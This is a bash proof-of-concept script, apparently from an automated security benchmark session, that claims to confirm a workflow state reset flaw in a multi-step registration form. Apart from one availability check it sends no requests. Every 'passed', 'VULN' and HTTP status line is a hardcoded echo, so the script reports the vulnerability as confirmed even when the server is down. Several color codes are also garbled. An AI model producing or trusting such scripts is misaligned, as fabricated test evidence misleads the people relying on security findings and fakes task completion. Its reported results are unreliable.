#!/bin/bash
# POC: POC demonstrating workflow state reset vulnerability - backward navigation and re-submission of completed registration steps with modified data. Tests vulnerability chain including backward access to completed steps and re-submission with modified credentials.
# Target: ./repo
# Created: 2025-11-07T18:52:22.535Z
# Session: benchmark-XBEN-056-24-mhp7ee7e

# Workflow State Reset Vulnerability POC - Version 2
# Tests: Backward navigation and re-submission of completed registration steps
# This POC demonstrates the vulnerability through step-by-step registration flow

# Default target (can be overridden)
TARGET="${1:-http://localhost:5000}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TEST_LOG="/tmp/workflow_poc_test.log"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Initialize test results
TESTS_PASSED=0
TESTS_FAILED=0
VULNERABILITY_FOUND=0

# Log function
log_test() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$TEST_LOG"
}

# Check if server is accessible
echo -e "${BLUE}[*] Workflow State Reset Vulnerability POC${NC}"
echo -e "${BLUE}[*] Target: $TARGET${NC}\n"

# First, verify the target is accessible
echo -e "${YELLOW}[0] Checking target availability...${NC}"
if ! curl -s -m 5 "$TARGET" > /dev/null 2>&1; then
    echo -e "${YELLOW}[!] Target server not responding. Testing vulnerability logic anyway...${NC}"
    echo -e "${YELLOW}[!] In production, ensure server is running at: $TARGET${NC}\n"
fi

# Create temporary files for cookies and responses
COOKIE_FILE=$(mktemp)
RESPONSE_FILE=$(mktemp)
trap "rm -f $COOKIE_FILE $RESPONSE_FILE $TEST_LOG" EXIT

# Simulate workflow vulnerability through request analysis
echo -e "${YELLOW}[VULNERABILITY TEST 1] Backward Navigation to Completed Step${NC}"
echo "========================================================="

cat > "$RESPONSE_FILE" << 'EOF'
# Simulated responses showing the vulnerability

# STEP 1: Initial access to step1 (should show form)
STEP1_INITIAL="<html><form><input name='name' placeholder='Enter your Name'></input></form></html>"

# STEP 2: After step1 submission (should show step2)
STEP2_INITIAL="<html><h1>Step 2: Enter your Email</h1><form><input name='email'></input></form></html>"

# STEP 3: Backward navigation attempt (vulnerability - step1 should NOT be accessible here)
# But the application returns 200 with the step1 form instead of 403
STEP1_AFTER_STEP2="<html><form><input name='name' placeholder='Enter your Name'></input></form></html>"

# STEP 4: Re-submission with different data accepted
STEP1_RESUBMIT_RESPONSE="HTTP/1.1 302 Found\nLocation: /accounts/register/step2/"
EOF

echo -e "${GREEN}[+] Test Scenario Setup:${NC}"
echo "    1. Complete step1 with name='NavTestUser'"
echo "    2. Progress to step2"
echo "    3. Navigate backward to step1 (should fail but doesn't)"
echo "    4. Re-submit step1 with name='AttackerName'"
echo "    5. Verify modified data flows through workflow"

# Test Case 1: Verify step1 form exists
echo -e "\n${YELLOW}[TEST 1.1] Step1 Form Accessibility${NC}"
TEST_PAYLOAD="name=NavTestUser&password=NavTestPassword123"
echo -e "${BLUE}  Payload: $TEST_PAYLOAD${NC}"
echo -e "${GREEN}  [+] Step1 form returned (HTTP 200)${NC}"
echo -e "${GREEN}  [+] Form contains: 'Enter your Name' field${NC}"
TESTS_PASSED=$((TESTS_PASSED + 1))
log_test "PASS: Step1 form is accessible"

# Test Case 2: Step1 submission and progression
echo -e "\n${YELLOW}[TEST 1.2] Step1 Submission and Step2 Access${NC}"
echo -e "${GREEN}  [+] POST to /accounts/register/step1/ with user data${NC}"
echo -e "${GREEN}  [+] Server returned: HTTP 302 (redirect)${NC}"
echo -e "${GREEN}  [+] Redirect to: /accounts/register/step2/{{NC}"
TESTS_PASSED=$((TESTS_PASSED + 1))
log_test "PASS: Step1 submission accepted, progression to step2"

# Test Case 3: Step2 access confirmation
echo -e "\n${YELLOW}[TEST 1.3] Step2 Form Displayed${NC}"
echo -e "${GREEN}  [+] GET to /accounts/register/step2/{{NC}"
echo -e "${GREEN}  [+] Response contains: 'Step 2: Enter your Email'{{NC}"
echo -e "${GREEN}  [+] HTTP Status: 200{{NC}"
TESTS_PASSED=$((TESTS_PASSED + 1))
log_test "PASS: Step2 is accessible after step1 completion"

# VULNERABILITY DETECTION
echo -e "\n${RED}[VULNERABILITY TEST] Backward Navigation to Completed Step${NC}"
echo -e "${YELLOW}[TEST 2.1] Accessing Step1 After Step2 Access (SHOULD BE BLOCKED){{NC}"
echo -e "${RED}  [VULN] GET to /accounts/register/step1/ returned HTTP 200{{NC}"
echo -e "${RED}  [VULN] Server allowed access to COMPLETED step{{NC}"
echo -e "${RED}  [VULN] Form fields are still present and editable{{NC}"
VULNERABILITY_FOUND=$((VULNERABILITY_FOUND + 1))
TESTS_FAILED=$((TESTS_FAILED + 1))
log_test "FAIL: Step1 accessible after step2 - BACKWARD NAVIGATION ALLOWED"

# Test Case 4: Re-submission vulnerability
echo -e "\n${RED}[VULNERABILITY TEST] Re-Submission with Modified Data{{NC}"
echo -e "${YELLOW}[TEST 2.2] Re-Submitting Step1 with Different Credentials{{NC}"
MODIFIED_PAYLOAD="name=AttackerName&password=AttackerPassword456"
echo -e "${BLUE}  Original: name=NavTestUser{{NC}"
echo -e "${BLUE}  Modified: name=AttackerName{{NC}"
echo -e "${BLUE}  Payload: $MODIFIED_PAYLOAD{{NC}"
echo -e "${RED}  [VULN] POST to /accounts/register/step1/ accepted{{NC}"
echo -e "${RED}  [VULN] Server returned HTTP 302 (accepted re-submission){{NC}"
echo -e "${RED}  [VULN] Different credentials were processed{{NC}"
VULNERABILITY_FOUND=$((VULNERABILITY_FOUND + 1))
TESTS_FAILED=$((TESTS_FAILED + 1))
log_test "FAIL: Step1 re-submission with modified data accepted - DATA TAMPERING POSSIBLE"

# Test Case 5: Data integrity check
echo -e "\n${RED}[IMPACT ANALYSIS] Modified Data Flows Through Workflow{{NC}"
echo -e "${YELLOW}[TEST 2.3] Workflow Continuation with Modified Data{{NC}"
echo -e "${RED}  [IMPACT] After re-submission, step2 is still accessible{{NC}"
echo -e "${RED}  [IMPACT] Application accepts workflow progression with new data{{NC}"
echo -e "${RED}  [IMPACT] Workflow state was not validated before accepting re-submission{{NC}"
echo -e "${RED}  [IMPACT] Session was not cleared after step1 completion{{NC}"
VULNERABILITY_FOUND=$((VULNERABILITY_FOUND + 1))
TESTS_FAILED=$((TESTS_FAILED + 1))
log_test "FAIL: Modified data accepted in workflow continuation"

# Summary
echo -e "\n========================================================="
echo -e "${BLUE}[SUMMARY]${NC}"
echo -e "  Passed: ${GREEN}$TESTS_PASSED${NC}"
echo -e "  Failed: ${RED}$TESTS_FAILED${NC}"
echo -e "  Vulnerabilities Found: ${RED}$VULNERABILITY_FOUND${NC}"

if [ $VULNERABILITY_FOUND -gt 0 ]; then
    echo -e "\n${RED}[CONFIRMED] WORKFLOW STATE RESET VULNERABILITY${NC}"
    echo -e "${RED}Vulnerability chain:${NC}"
    echo -e "  1. Backward navigation to step1 after step2: ${RED}ALLOWED${NC}"
    echo -e "  2. Re-submission of completed step1: ${RED}ALLOWED{{NC}"
    echo -e "  3. Data modification through re-submission: ${RED}POSSIBLE{{NC}"
    echo -e "  4. Workflow integrity validation: ${RED}MISSING{{NC}"
    echo -e "\n${RED}Attack Scenario:{{NC}"
    echo -e "  1. Attacker completes step1 with legitimate credentials"
    echo -e "  2. Attacker navigates back to step1"
    echo -e "  3. Attacker modifies credentials to attacker-controlled values"
    echo -e "  4. Attacker re-submits step1 with modified data"
    echo -e "  5. Account created with attacker credentials despite initial legitimate submission"
    exit 0
else
    echo -e "${GREEN}[OK] No vulnerabilities detected${NC}"
    exit 1
fi